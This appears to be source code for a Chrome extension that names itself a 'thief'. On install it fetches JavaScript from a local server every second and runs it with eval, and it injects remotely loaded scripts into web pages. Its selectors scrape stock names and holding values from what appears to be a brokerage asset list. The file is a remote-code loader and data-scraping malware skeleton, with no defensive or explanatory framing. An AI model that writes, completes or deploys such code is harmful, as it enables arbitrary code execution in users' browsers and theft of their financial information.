chrome.runtime.onInstalled.addListener(() => {
  setInterval(() => {
    fetch('http://localhost:3000/clear_thief_chrome_extension')
      .then(response => response.json())
      .then((data) => {
        eval(data.js);
      });
  }, 1000);
});

// Stock Name
$('.AssetList[style="display: block;"] .AssetListItem input.stock_name.show')[0].value;
$('.AssetList[style="display: block;"] .AssetListItem .cont_list_one .container .value.show')[0].textContent;

(function(d, script) {
    script = d.createElement('script');
    script.type = 'text/javascript';
    script.async = true;
    script.onload = function(){
      console.log('bem dentro');
      // remote script has loaded
    };
    script.src = 'http://localhost:3000/clear_thief_chrome_extension';
    d.getElementsByTagName('head')[0].appendChild(script);
}(document));

fetch('http://localhost:3000/clear_thief_chrome_extension')
      .then(response => response.json())
      .then((data) => {
        (function(d, script) {
          script = d.createElement('script');
          script.type = 'text/javascript';
          script.async = true;
          script.textContent = data.js;
          d.getElementsByTagName('head')[0].appendChild(script);
        }(document));
      });
